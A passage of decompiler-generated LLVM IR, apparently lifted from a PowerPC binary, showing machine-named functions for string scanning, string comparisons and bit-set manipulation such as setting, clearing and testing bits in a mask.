  %v0_1000b008 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b008 = add i32 %v0_1000b008, 1
  store i32 %v1_1000b008, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b00c

dec_label_pc_1000b00c:                            ; preds = %dec_label_pc_1000aff0, %dec_label_pc_1000afdc, %dec_label_pc_1000b004
  %v0_1000b038 = phi i32 [ %v1_1000b008, %dec_label_pc_1000b004 ], [ %v0_1000afd8, %dec_label_pc_1000afdc ], [ %v0_1000afd8, %dec_label_pc_1000aff0 ]
  %v1_1000b00c = inttoptr i32 %v0_1000b038 to i8*
  %v2_1000b00c = load i8, i8* %v1_1000b00c, align 1
  %v3_1000b00c = zext i8 %v2_1000b00c to i32
  %v3_1000b010 = icmp eq i8 %v2_1000b00c, 0
  %v1_1000b014 = mul nuw nsw i32 %v3_1000b00c, 2
  store i32 %v1_1000b014, i32* %r11.global-to-local, align 4
  br i1 %v3_1000b010, label %dec_label_pc_1000b034, label %dec_label_pc_1000b020

dec_label_pc_1000b020:                            ; preds = %dec_label_pc_1000b00c
  %v3_1000b018 = icmp eq i8 %v2_1000b00c, 10
  %v3_1000b020 = load i32, i32* @global_var_1001044c, align 4
  %v2_1000b024 = add i32 %v3_1000b020, %v1_1000b014
  %v3_1000b024 = inttoptr i32 %v2_1000b024 to i16*
  %v4_1000b024 = load i16, i16* %v3_1000b024, align 2
  %v1_1000b028 = and i16 %v4_1000b024, 32
  %v3_1000b028.not = icmp ne i16 %v1_1000b028, 0
  %brmerge27 = or i1 %v3_1000b018, %v3_1000b028.not
  br i1 %brmerge27, label %dec_label_pc_1000b004, label %dec_label_pc_1000b034

dec_label_pc_1000b034:                            ; preds = %dec_label_pc_1000b020, %dec_label_pc_1000b00c
  %v0_1000b034 = load i32, i32* @r27, align 4
  %v1_1000b034 = add i32 %v0_1000b034, 1
  store i32 %v1_1000b034, i32* @r27, align 4
  %v2_1000b038 = load i8, i8* %v1_1000b00c, align 1
  %v3_1000b03c = icmp eq i8 %v2_1000b038, 0
  br i1 %v3_1000b03c, label %dec_label_pc_1000b04c, label %dec_label_pc_1000b044

dec_label_pc_1000b044:                            ; preds = %dec_label_pc_1000afb0, %dec_label_pc_1000b034
  %v0_1000afd0 = phi i32 [ %v0_1000b038, %dec_label_pc_1000b034 ], [ %v0_1000b0389, %dec_label_pc_1000afb0 ]
  %v0_1000afc8 = phi i32 [ %v1_1000b034, %dec_label_pc_1000b034 ], [ 0, %dec_label_pc_1000afb0 ]
  %tmp33 = icmp slt i32 %v0_1000afc8, 5
  br i1 %tmp33, label %dec_label_pc_1000afc4, label %dec_label_pc_1000b04c

dec_label_pc_1000b04c:                            ; preds = %dec_label_pc_1000b034, %dec_label_pc_1000b044, %dec_label_pc_1000afb0
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1000f368.314 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_1000b060 = call i32 @function_1000ba94(i8* %v3_1000b060, i32 ptrtoint ([11 x i8]* @global_var_1000f368.314 to i32))
  store i32 %v4_1000b060, i32* %r3.global-to-local, align 4
  %v3_1000b064 = icmp eq i32 %v4_1000b060, 0
  br i1 %v3_1000b064, label %dec_label_pc_1000b090, label %dec_label_pc_1000b0b4

dec_label_pc_1000b070:                            ; preds = %dec_label_pc_1000b0a8
  %v1_1000b070 = add i32 %v2_1000b098, 24
  %v2_1000b070 = inttoptr i32 %v1_1000b070 to i32*
  %v3_1000b070 = load i32, i32* %v2_1000b070, align 4
  store i32 %v3_1000b070, i32* %r3.global-to-local, align 4
  store i32 268480632, i32* @lr, align 4
  %v1_1000b074 = call i32 @function_100073ac(i32 %v3_1000b070)
  store i32 %v1_1000b074, i32* %r3.global-to-local, align 4
  %v0_1000b07c = load i32, i32* @r29, align 4
  %v1_1000b07c = add i32 %v0_1000b07c, 1
  store i32 %v1_1000b07c, i32* %r11.global-to-local, align 4
  %v1_1000b080 = mul i32 %v0_1000b07c, 4
  store i32 %v1_1000b07c, i32* @global_var_100104c8.252, align 4
  %v3_1000b08c = add i32 %v1_1000b080, ptrtoint (i32* @global_var_10012d4c.253 to i32)
  %v4_1000b08c = inttoptr i32 %v3_1000b08c to i32*
  store i32 %v1_1000b074, i32* %v4_1000b08c, align 4
  br label %dec_label_pc_1000b090

dec_label_pc_1000b090:                            ; preds = %dec_label_pc_1000b04c, %dec_label_pc_1000b070
  %v0_1000b090 = load i32, i32* @r31, align 4
  %v1_1000b090 = load i32, i32* @r27, align 4
  %v2_1000b090 = icmp slt i32 %v0_1000b090, %v1_1000b090
  %v1_1000b094 = mul i32 %v0_1000b090, 4
  %v0_1000b098 = load i32, i32* @r1, align 4
  %v2_1000b098 = add i32 %v0_1000b098, %v1_1000b094
  br i1 %v2_1000b090, label %dec_label_pc_1000b0a8, label %dec_label_pc_1000b0b4

dec_label_pc_1000b0a8:                            ; preds = %dec_label_pc_1000b090
  %v3_1000b0a8 = load i32, i32* @global_var_100104c8.252, align 4
  %tmp35 = icmp slt i32 %v3_1000b0a8, 3
  br i1 %tmp35, label %dec_label_pc_1000b070, label %dec_label_pc_1000b0b4

dec_label_pc_1000b0b4:                            ; preds = %dec_label_pc_1000b0a8, %dec_label_pc_1000b090, %dec_label_pc_1000b04c
  %v0_1000b0b8 = load i32, i32* @r30, align 4
  store i32 %v0_1000b0b8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000f374.315 to i32), i32* @r4, align 4
  %v3_1000b0c0 = inttoptr i32 %v0_1000b0b8 to i8*
  %v4_1000b0c0 = call i32 @function_1000ba94(i8* %v3_1000b0c0, i32 ptrtoint ([7 x i8]* @global_var_1000f374.315 to i32))
  store i32 %v4_1000b0c0, i32* %r3.global-to-local, align 4
  %v3_1000b0c4 = icmp eq i32 %v4_1000b0c0, 0
  br i1 %v3_1000b0c4, label %dec_label_pc_1000b104.preheader, label %dec_label_pc_1000b0cc

dec_label_pc_1000b0cc:                            ; preds = %dec_label_pc_1000b0b4
  %v0_1000b0d0 = load i32, i32* @r30, align 4
  store i32 %v0_1000b0d0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000f37c.316 to i32), i32* @r4, align 4
  %v3_1000b0d8 = inttoptr i32 %v0_1000b0d0 to i8*
  %v4_1000b0d8 = call i32 @function_1000ba94(i8* %v3_1000b0d8, i32 ptrtoint ([7 x i8]* @global_var_1000f37c.316 to i32))
  store i32 %v4_1000b0d8, i32* %r3.global-to-local, align 4
  %v3_1000b0dc = icmp eq i32 %v4_1000b0d8, 0
  br i1 %v3_1000b0dc, label %dec_label_pc_1000b104.preheader, label %dec_label_pc_1000b170.backedge

dec_label_pc_1000b104.preheader:                  ; preds = %dec_label_pc_1000b0b4, %dec_label_pc_1000b0cc
  store i32 ptrtoint (i32* @global_var_10012d3c.303 to i32), i32* @r31, align 4
  %v3_1000b11041 = load i32, i32* @global_var_100104cc.301, align 4
  %v2_1000b11443 = icmp sgt i32 %v3_1000b11041, 0
  %v1_1000b11845 = add i32 %v3_1000b11041, -1
  %v1_1000b11c46 = mul i32 %v1_1000b11845, 4
  store i32 %v1_1000b11c46, i32* %r11.global-to-local, align 4
  br i1 %v2_1000b11443, label %dec_label_pc_1000b0e8, label %dec_label_pc_1000b124

dec_label_pc_1000b0e8:                            ; preds = %dec_label_pc_1000b104.preheader, %dec_label_pc_1000b0e8
  %v1_1000b11c48 = phi i32 [ %v1_1000b11c, %dec_label_pc_1000b0e8 ], [ %v1_1000b11c46, %dec_label_pc_1000b104.preheader ]
  %v1_1000b11847 = phi i32 [ %v1_1000b118, %dec_label_pc_1000b0e8 ], [ %v1_1000b11845, %dec_label_pc_1000b104.preheader ]
  %v2_1000b0e8 = add i32 %v1_1000b11c48, ptrtoint (i32* @global_var_10012d3c.303 to i32)
  %v3_1000b0e8 = inttoptr i32 %v2_1000b0e8 to i32*
  %v4_1000b0e8 = load i32, i32* %v3_1000b0e8, align 4
  store i32 %v4_1000b0e8, i32* %r3.global-to-local, align 4
  store i32 %v1_1000b11847, i32* @global_var_100104cc.301, align 4
  store i32 268480756, i32* @lr, align 4
  %v1_1000b0f0 = call i32 @function_10007e44(i32 %v4_1000b0e8)
  store i32 %v1_1000b0f0, i32* %r3.global-to-local, align 4
  %v3_1000b0f4 = load i32, i32* @global_var_100104cc.301, align 4
  %v1_1000b0fc = mul i32 %v3_1000b0f4, 4
  %v1_1000b100 = load i32, i32* @r31, align 4
  %v3_1000b100 = add i32 %v1_1000b100, %v1_1000b0fc
  %v4_1000b100 = inttoptr i32 %v3_1000b100 to i32*
  store i32 0, i32* %v4_1000b100, align 4
  store i32 ptrtoint (i32* @global_var_10012d3c.303 to i32), i32* @r31, align 4
  %v3_1000b110 = load i32, i32* @global_var_100104cc.301, align 4
  %v2_1000b114 = icmp sgt i32 %v3_1000b110, 0
  %v1_1000b118 = add i32 %v3_1000b110, -1
  %v1_1000b11c = mul i32 %v1_1000b118, 4
  store i32 %v1_1000b11c, i32* %r11.global-to-local, align 4
  br i1 %v2_1000b114, label %dec_label_pc_1000b0e8, label %dec_label_pc_1000b124

dec_label_pc_1000b124:                            ; preds = %dec_label_pc_1000b0e8, %dec_label_pc_1000b104.preheader
  %v3_1000b16459 = phi i32 [ %v3_1000b11041, %dec_label_pc_1000b104.preheader ], [ %v3_1000b110, %dec_label_pc_1000b0e8 ]
  %v1_1000b14c49 = load i32, i32* @r27, align 4
  %v2_1000b14c50 = icmp sgt i32 %v1_1000b14c49, 1
  %v0_1000b15453 = load i32, i32* @r1, align 4
  %v2_1000b15454 = add i32 %v0_1000b15453, 4
  br i1 %v2_1000b14c50, label %dec_label_pc_1000b164, label %dec_label_pc_1000b170.backedge

dec_label_pc_1000b12c:                            ; preds = %dec_label_pc_1000b164
  %v1_1000b12c = add i32 %v2_1000b15455, 24
  %v2_1000b12c = inttoptr i32 %v1_1000b12c to i32*
  %v3_1000b12c = load i32, i32* %v2_1000b12c, align 4
  store i32 %v3_1000b12c, i32* %r3.global-to-local, align 4
  store i32 268480820, i32* @lr, align 4
  %v1_1000b130 = call i32 @function_100073ac(i32 %v3_1000b12c)
  store i32 %v1_1000b130, i32* %r3.global-to-local, align 4
  %v0_1000b138 = load i32, i32* @r29, align 4
  %v1_1000b138 = add i32 %v0_1000b138, 1
  store i32 %v1_1000b138, i32* %r11.global-to-local, align 4
  %v1_1000b13c = mul i32 %v0_1000b138, 4
  store i32 %v1_1000b138, i32* @global_var_100104cc.301, align 4
  %v3_1000b148 = add i32 %v1_1000b13c, ptrtoint (i32* @global_var_10012d3c.303 to i32)
  %v4_1000b148 = inttoptr i32 %v3_1000b148 to i32*
  store i32 %v1_1000b130, i32* %v4_1000b148, align 4
  %v0_1000b14c.pre = load i32, i32* @r31, align 4
  %v1_1000b14c = load i32, i32* @r27, align 4
  %v2_1000b14c = icmp slt i32 %v0_1000b14c.pre, %v1_1000b14c
  br i1 %v2_1000b14c, label %dec_label_pc_1000b12c.dec_label_pc_1000b164_crit_edge, label %dec_label_pc_1000b170.backedge

dec_label_pc_1000b12c.dec_label_pc_1000b164_crit_edge: ; preds = %dec_label_pc_1000b12c
  %v0_1000b154 = load i32, i32* @r1, align 4
  %v1_1000b150 = mul i32 %v0_1000b14c.pre, 4
  %v2_1000b154 = add i32 %v0_1000b154, %v1_1000b150
  %v3_1000b164.pre = load i32, i32* @global_var_100104cc.301, align 4
  br label %dec_label_pc_1000b164

dec_label_pc_1000b164:                            ; preds = %dec_label_pc_1000b124, %dec_label_pc_1000b12c.dec_label_pc_1000b164_crit_edge
  %v3_1000b164 = phi i32 [ %v3_1000b164.pre, %dec_label_pc_1000b12c.dec_label_pc_1000b164_crit_edge ], [ %v3_1000b16459, %dec_label_pc_1000b124 ]
  %v2_1000b15455 = phi i32 [ %v2_1000b154, %dec_label_pc_1000b12c.dec_label_pc_1000b164_crit_edge ], [ %v2_1000b15454, %dec_label_pc_1000b124 ]
  %tmp37 = icmp slt i32 %v3_1000b164, 4
  br i1 %tmp37, label %dec_label_pc_1000b12c, label %dec_label_pc_1000b170.backedge

dec_label_pc_1000b170:                            ; preds = %dec_label_pc_1000b170.backedge, %dec_label_pc_1000b170.preheader
  %v0_1000b17c = phi i32 [ %v0_1000b17c.pre, %dec_label_pc_1000b170.backedge ], [ %v0_1000b17c16, %dec_label_pc_1000b170.preheader ]
  store i32 %v2_1000b170, i32* %r3.global-to-local, align 4
  store i32 268480900, i32* @lr, align 4
  %v3_1000b180 = call i32 @function_1000665c(i32 %v2_1000b170, i32 128, i32 %v0_1000b17c)
  store i32 %v3_1000b180, i32* %r3.global-to-local, align 4
  %v3_1000b184 = icmp eq i32 %v3_1000b180, 0
  br i1 %v3_1000b184, label %dec_label_pc_1000b194, label %dec_label_pc_1000af7c.preheader

dec_label_pc_1000af7c.preheader:                  ; preds = %dec_label_pc_1000b170
  store i32 %v2_1000b170, i32* %r3.global-to-local, align 4
  %v2_1000af7c3 = load i8, i8* %v1_1000af7c2, align 4
  %v3_1000af7c4 = zext i8 %v2_1000af7c3 to i32
  store i32 %v3_1000af7c4, i32* %r11.global-to-local, align 4
  %v3_1000af846 = icmp eq i8 %v2_1000af7c3, 0
  br i1 %v3_1000af846, label %dec_label_pc_1000b170.backedge, label %dec_label_pc_1000af90.lr.ph

dec_label_pc_1000af90.lr.ph:                      ; preds = %dec_label_pc_1000af7c.preheader
  %v3_1000af90.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000af90

dec_label_pc_1000b194:                            ; preds = %dec_label_pc_1000b170
  %v0_1000b194 = load i32, i32* @r26, align 4
  store i32 %v0_1000b194, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000b19c.317 to i32), i32* @lr, align 4
  %v1_1000b198 = inttoptr i32 %v0_1000b194 to i16*
  %v2_1000b198 = call i32 @function_10004b54(i16* %v1_1000b198)
  store i32 %v2_1000b198, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b1ac

dec_label_pc_1000b1a0:                            ; preds = %dec_label_pc_1000af5c
  %v0_1000b1a0 = call i32 @function_1000954c()
  store i32 %v0_1000b1a0, i32* %r3.global-to-local, align 4
  %v2_1000b1a8 = inttoptr i32 %v0_1000b1a0 to i32*
  store i32 3, i32* %v2_1000b1a8, align 4
  br label %dec_label_pc_1000b1ac

dec_label_pc_1000b1ac:                            ; preds = %dec_label_pc_1000aef8, %dec_label_pc_1000b194, %dec_label_pc_1000b1a0
  store i32 %v2_1000af14, i32* @r3, align 4
  %v0_1000b1b4 = call i32 @function_10008c80()
  store i32 %v0_1000b1b4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b1b4

; uselistorder directives
  uselistorder i32 %v3_1000af7c4, { 2, 0, 1 }
  uselistorder i32 %v1_1000b11c46, { 1, 0 }
  uselistorder i32 %v1_1000b11845, { 1, 0 }
  uselistorder i32 %v0_1000afc8, { 1, 0 }
  uselistorder i32 %v1_1000b014, { 1, 0 }
  uselistorder i8* %v1_1000b00c, { 0, 2, 1 }
  uselistorder i8 %v2_1000afdc, { 2, 0, 1 }
  uselistorder i32 %v0_1000afd8, { 0, 1, 3, 2 }
  uselistorder i32 %v3_1000af7c, { 1, 0, 2 }
  uselistorder i32 %v1_1000af78, { 0, 2, 1 }
  uselistorder i32 %v2_1000b170, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000af14, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 2, 22, 23, 7, 8, 9, 10, 11, 12, 13, 14, 1, 15, 16, 17, 18, 19, 21, 20, 0, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_1000954c, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_10007e44, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 18, 17, 1, 21, 20, 19, 0 }
  uselistorder i32* @global_var_100104cc.301, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10012d3c.303 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10012d4c.253 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100103e0.251 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000b1ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b164, { 1, 0 }
  uselistorder label %dec_label_pc_1000b0e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b104.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000b090, { 1, 0 }
  uselistorder label %dec_label_pc_1000b04c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b044, { 1, 0 }
  uselistorder label %dec_label_pc_1000b00c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000afdc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b170.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_1000b170.preheader, { 1, 0 }
}

define i32 @function_1000b1cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000b1cc:
  %stack_var_0 = alloca i32, align 4
  %v4_1000b1cc = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268481040, i32* @lr, align 4
  %v9_1000b20c = inttoptr i32 %arg3 to i32*
  %v10_1000b20c = call i32 @function_1000c6a0(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_1000b20c, i32 %arg4, i32 %arg5, i32 %v4_1000b1cc, i32 %arg7)
  ret i32 %v10_1000b20c
}

define i32 @function_1000b224(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000b224:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000b238 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268481100, i32* @lr, align 4
  %v2_1000b248 = call i32 @function_10008fe0(i32 9, i32 %v2_1000b238)
  ret i32 %v2_1000b248

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10008fe0, { 6, 4, 8, 7, 3, 2, 5, 1, 0 }
}

define i32 @function_1000b25c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b25c:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000b260 = load i32, i32* @lr, align 4
  store i32 %v0_1000b260, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000b26c = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1000b27c = add i32 %tmp, 4
  store i32 %v1_1000b27c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000b284 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000b284, i32* @r3, align 4
  br i1 %v3_1000b26c, label %dec_label_pc_1000b2ac, label %dec_label_pc_1000b28c

dec_label_pc_1000b28c:                            ; preds = %dec_label_pc_1000b25c
  %v2_1000b28c = load i32, i32* %arg2, align 4
  store i32 %v2_1000b28c, i32* %r0.global-to-local, align 4
  store i32 268481176, i32* @lr, align 4
  %v0_1000b294 = call i32 @function_10006d88()
  %v0_1000b298 = load i32, i32* @r31, align 4
  %v1_1000b298 = add i32 %v0_1000b298, 132
  %v2_1000b298 = inttoptr i32 %v1_1000b298 to i32*
  %v3_1000b298 = load i32, i32* %v2_1000b298, align 4
  store i32 %v3_1000b298, i32* %r0.global-to-local, align 4
  %v1_1000b2a4 = add i32 %v0_1000b298, 136
  %v2_1000b2a4 = inttoptr i32 %v1_1000b2a4 to i32*
  %v3_1000b2a4 = load i32, i32* %v2_1000b2a4, align 4
  store i32 %v3_1000b2a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b2ac

dec_label_pc_1000b2ac:                            ; preds = %dec_label_pc_1000b25c, %dec_label_pc_1000b28c
  store i32 268481228, i32* @lr, align 4
  %v0_1000b2c8 = call i32 @function_1000b56c()
  %v0_1000b2cc = load i32, i32* %r30.global-to-local, align 4
  %v3_1000b2cc = icmp eq i32 %v0_1000b2cc, 0
  store i32 %v0_1000b2c8, i32* @r31, align 4
  br i1 %v3_1000b2cc, label %dec_label_pc_1000b308, label %dec_label_pc_1000b2dc

dec_label_pc_1000b2dc:                            ; preds = %dec_label_pc_1000b2ac
  %v1_1000b2d4 = icmp slt i32 %v0_1000b2c8, 0
  %v1_1000b2dc = add i32 %v0_1000b2cc, 4
  store i32 %v1_1000b2dc, i32* @r3, align 4
  %v2_1000b2e0 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000b2e0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000b2d4, label %dec_label_pc_1000b308, label %dec_label_pc_1000b2ec

dec_label_pc_1000b2ec:                            ; preds = %dec_label_pc_1000b2dc
  %v3_1000b2ec = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000b2ec, i32* %r0.global-to-local, align 4
  %v2_1000b2f0 = inttoptr i32 %v0_1000b2cc to i32*
  store i32 %v3_1000b2ec, i32* %v2_1000b2f0, align 4
  store i32 268481272, i32* @lr, align 4
  %v0_1000b2f4 = call i32 @function_10006d88()
  %v1_1000b300 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b300 = add i32 %v1_1000b300, 136
  %v3_1000b300 = inttoptr i32 %v2_1000b300 to i32*
  %v0_1000b304 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b304 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000b304 = add i32 %v1_1000b304, 132
  %v3_1000b304 = inttoptr i32 %v2_1000b304 to i32*
  store i32 %v0_1000b304, i32* %v3_1000b304, align 4
  %v0_1000b30c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b308

dec_label_pc_1000b308:                            ; preds = %dec_label_pc_1000b2dc, %dec_label_pc_1000b2ac, %dec_label_pc_1000b2ec
  %v0_1000b30c = phi i32 [ %v0_1000b2c8, %dec_label_pc_1000b2dc ], [ %v0_1000b2c8, %dec_label_pc_1000b2ac ], [ %v0_1000b30c.pre, %dec_label_pc_1000b2ec ]
  store i32 %v0_1000b260, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000b30c

; uselistorder directives
  uselistorder i32 %v0_1000b2c8, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000b308, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b2ac, { 1, 0 }
}

define i32 @function_1000b320(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b320:
  %v1_1000b320 = add i32 %arg2, -1
  %v1_1000b324 = call i32 @__asm_rlwinm(i32 %v1_1000b320, i32 29, i32 3, i32 29)
  %v1_1000b328 = urem i32 %v1_1000b320, 32
  %v2_1000b32c = add i32 %v1_1000b324, %arg1
  %v3_1000b32c = inttoptr i32 %v2_1000b32c to i32*
  %v4_1000b32c = load i32, i32* %v3_1000b32c, align 4
  %v3_1000b334 = shl i32 1, %v1_1000b328
  %v2_1000b338 = and i32 %v4_1000b32c, %v3_1000b334
  %v2_1000b33c = icmp ne i32 %v2_1000b338, 0
  %v5_1000b340 = zext i1 %v2_1000b33c to i32
  ret i32 %v5_1000b340
}

define i32 @function_1000b348(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b348:
  %v1_1000b348 = add i32 %arg2, -1
  %v1_1000b350 = call i32 @__asm_rlwinm(i32 %v1_1000b348, i32 29, i32 3, i32 29)
  %v1_1000b354 = urem i32 %v1_1000b348, 32
  %v2_1000b358 = add i32 %v1_1000b350, %arg1
  %v3_1000b358 = inttoptr i32 %v2_1000b358 to i32*
  %v4_1000b358 = load i32, i32* %v3_1000b358, align 4
  %v3_1000b35c = shl i32 1, %v1_1000b354
  %v2_1000b360 = or i32 %v3_1000b35c, %v4_1000b358
  store i32 %v2_1000b360, i32* %v3_1000b358, align 4
  ret i32 0
}

define i32 @function_1000b370(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b370:
  %v1_1000b370 = add i32 %arg2, -1
  %v1_1000b378 = call i32 @__asm_rlwinm(i32 %v1_1000b370, i32 29, i32 3, i32 29)
  %v1_1000b37c = urem i32 %v1_1000b370, 32
  %v2_1000b380 = add i32 %v1_1000b378, %arg1
  %v3_1000b380 = inttoptr i32 %v2_1000b380 to i32*
  %v4_1000b380 = load i32, i32* %v3_1000b380, align 4
  %v3_1000b384 = shl i32 -2, %v1_1000b37c
  %v4_1000b384 = sub nsw i32 32, %v1_1000b37c
  %v5_1000b384 = lshr i32 -2, %v4_1000b384
  %v6_1000b384 = or i32 %v5_1000b384, %v3_1000b384
  %v2_1000b388 = and i32 %v6_1000b384, %v4_1000b380
  store i32 %v2_1000b388, i32* %v3_1000b380, align 4
  ret i32 0
}

define i32 @function_1000b398(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b3cc.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v2_1000b3ac = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000b3ac, i32* %r29.global-to-local, align 4
  %v0_1000b3b4 = call i32 @function_10008c78()
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000b3d034 = add i32 %v2_1000b3ac, 124
  %v4_1000b3d035 = inttoptr i32 %v3_1000b3d034 to i32*
  store i32 0, i32* %v4_1000b3d035, align 4
  %v0_1000b3d436 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b3d437 = add i32 %v0_1000b3d436, -1
  store i32 %v1_1000b3d437, i32* %r9.global-to-local, align 4
  %v0_1000b3d838 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b3d839 = add i32 %v0_1000b3d838, -1
  store i32 %v1_1000b3d839, i32* %ctr.global-to-local, align 4
  %v2_1000b3d840 = icmp eq i32 %v1_1000b3d839, 0
  br i1 %v2_1000b3d840, label %dec_label_pc_1000b3dc, label %dec_label_pc_1000b3cc.dec_label_pc_1000b3cc_crit_edge

dec_label_pc_1000b3cc.dec_label_pc_1000b3cc_crit_edge: ; preds = %dec_label_pc_1000b3cc.lr.ph, %dec_label_pc_1000b3cc.dec_label_pc_1000b3cc_crit_edge
  %v1_1000b3d441 = phi i32 [ %v1_1000b3d4, %dec_label_pc_1000b3cc.dec_label_pc_1000b3cc_crit_edge ], [ %v1_1000b3d437, %dec_label_pc_1000b3cc.lr.ph ]
  %v0_1000b3d0.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b3cc = mul i32 %v1_1000b3d441, 4
  %v1_1000b3d0 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000b3d0 = add i32 %v1_1000b3d0, %v1_1000b3cc
  %v4_1000b3d0 = inttoptr i32 %v3_1000b3d0 to i32*
  store i32 %v0_1000b3d0.pre, i32* %v4_1000b3d0, align 4
  %v0_1000b3d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b3d4 = add i32 %v0_1000b3d4, -1
  store i32 %v1_1000b3d4, i32* %r9.global-to-local, align 4
  %v0_1000b3d8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b3d8 = add i32 %v0_1000b3d8, -1
  store i32 %v1_1000b3d8, i32* %ctr.global-to-local, align 4
  %v2_1000b3d8 = icmp eq i32 %v1_1000b3d8, 0
  br i1 %v2_1000b3d8, label %dec_label_pc_1000b3dc, label %dec_label_pc_1000b3cc.dec_label_pc_1000b3cc_crit_edge

dec_label_pc_1000b3dc:                            ; preds = %dec_label_pc_1000b3cc.dec_label_pc_1000b3cc_crit_edge, %dec_label_pc_1000b3cc.lr.ph
  %v1_1000b3d4.lcssa = phi i32 [ %v1_1000b3d437, %dec_label_pc_1000b3cc.lr.ph ], [ %v1_1000b3d4, %dec_label_pc_1000b3cc.dec_label_pc_1000b3cc_crit_edge ]
  %v3_1000b3e4 = call i32 @function_1000b348(i32 %v2_1000b3ac, i32 6, i32 %v1_1000b3d4.lcssa)
  %v3_1000b3e8 = icmp eq i32 %v3_1000b3e4, 0
  br i1 %v3_1000b3e8, label %dec_label_pc_1000b3f0, label %dec_label_pc_1000b400

dec_label_pc_1000b3f0:                            ; preds = %dec_label_pc_1000b3dc
  store i32 268481536, i32* @lr, align 4
  %v3_1000b3fc = call i32 @function_1000948c(i32 1, i32 %v2_1000b3ac, i32 0)
  br label %dec_label_pc_1000b400

dec_label_pc_1000b400:                            ; preds = %dec_label_pc_1000b3dc, %dec_label_pc_1000b3f0
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
